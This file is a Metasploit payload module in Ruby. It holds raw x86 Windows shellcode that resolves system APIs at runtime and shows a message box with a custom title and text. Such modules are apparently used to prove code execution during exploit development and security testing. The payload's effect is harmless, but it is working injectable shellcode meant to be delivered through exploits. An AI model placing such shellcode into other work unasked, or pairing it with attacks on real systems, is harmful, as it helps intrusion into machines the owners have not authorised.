##
# $Id: messagebox.rb 1 2010-02-26 00:28:00:00Z corelanc0d3r & rick2600 $
##

require 'msf/core'
module Metasploit3

include Msf::Payload::Windows
include Msf::Payload::Single

  def initialize(info = {})
      super(update_info(info,
       'Name'          => 'Windows Messagebox with custom title and text',
       'Version'       => '$Revision: 1 $',
       'Description'   => 'Spawns MessageBox with a customizable title & text',
       'Author'        => [ 'corelanc0d3r - peter.ve[at]corelan.be', 
                                'rick2600 - ricks2600[at]gmail.com' ],
       'License'       => BSD_LICENSE,
       'Platform'      => 'win',
       'Arch'          => ARCH_X86,
       'Privileged'    => false,
       'Payload'       =>
               {
               'Offsets' => { },
               'Payload' =>    "\x56\x31\xc0\x31\xdb\xb3\x30\x64"+
                               "\x8b\x03\x8b\x40\x0c\x8b\x40\x14"+
                               "\x50\x5e\x8b\x06\x50\x5e\x8b\x06"+
                               "\x8b\x40\x10\x5e\xe9\x92\x00\x00"+
                               "\x00\x60\x8b\x6c\x24\x24\x8b\x45"+
                               "\x3c\x8b\x54\x05\x78\x01\xea\x8b"+
                               "\x4a\x18\x8b\x5a\x20\x01\xeb\xe3"+
                               "\x37\x49\x8b\x34\x8b\x01\xee\x31"+
                               "\xff\x31\xc0\xfc\xac\x84\xc0\x74"+
                               "\x0a\xc1\xcf\x0d\x01\xc7\xe9\xf1"+
                               "\xff\xff\xff\x3b\x7c\x24\x28\x75"+
                               "\xde\x8b\x5a\x24\x01\xeb\x66\x8b"+
                               "\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b"+
                               "\x04\x8b\x01\xe8\x89\x44\x24\x1c"+
                               "\x61\xc3\xad\x50\x52\xe8\xa7\xff"+
                               "\xff\xff\x89\x07\x81\xc4\x08\x00"+
                               "\x00\x00\x81\xc7\x04\x00\x00\x00"+
                               "\x39\xce\x75\xe6\xc3\xe8\x46\x00"+
                               "\x00\x00\x75\x73\x65\x72\x33\x32"+
                               "\x2e\x64\x6c\x6c\x00\xe8\x20\x00"+
                               "\x00\x00\x8e\x4e\x0e\xec\x7e\xd8"+
                               "\xe2\x73\xe8\x33\x00\x00\x00\xa8"+
                               "\xa2\x4d\xbc\x81\xec\x08\x00\x00"+
                               "\x00\x89\xe5\x89\xc2\xe9\xdb\xff"+
                               "\xff\xff\x5e\x8d\x7d\x04\x89\xf1"+
                               "\x81\xc1\x08\x00\x00\x00\xe8\x9f"+
                               "\xff\xff\xff\xe9\xb5\xff\xff\xff"+
                               "\xff\x55\x04\x89\xc2\xe9\xc8\xff"+
                               "\xff\xff\x5e\xad\x50\x52\xe8\x36"+
                               "\xff\xff\xff\xe9\x15\x00\x00\x00"+
                               "\x5b\xe9"
                        }
                        ))

                # EXITFUNC : hardcoded to ExitProcess :/
                deregister_options('EXITFUNC')

                # Register command execution options
                register_options(
                     [
                      OptString.new('TITLE', [ true, 
                                   "Messagebox Title (max 255 chars)" ]),
                      OptString.new('TEXT', [ true, 
                                   "Messagebox Text" ])
                      ], self.class)
        end

    #
    # Constructs the payload
    #
   def generate
     strTitle = datastore['TITLE']        
     if (strTitle)
       iTitle=strTitle.length
       if (iTitle < 255)
         offset2Title = (15 + 5 + iTitle + 1).chr
         offsetBack = (255 - (15 + 5 + iTitle + 5)).chr            
         payload_data = module_info['Payload']['Payload']               
         payload_data += offset2Title            
         payload_data += "\x00\x00\x00\x59\x31\xd2\x52\x53\x51\x52\xff\xd0\x31"
         payload_data += "\xc0\x50\xff\x55\x08\xe8\xe6\xff\xff\xff"             
         payload_data += strTitle            
         payload_data += "\x00\xe8"             
         payload_data += offsetBack             
         payload_data += "\xff\xff\xff"         
         payload_data += datastore['TEXT']+ "\x00"
         return payload_data
       else
         raise ArgumentError, "Title should be 255 characters or less"
       end
     end 
   end
end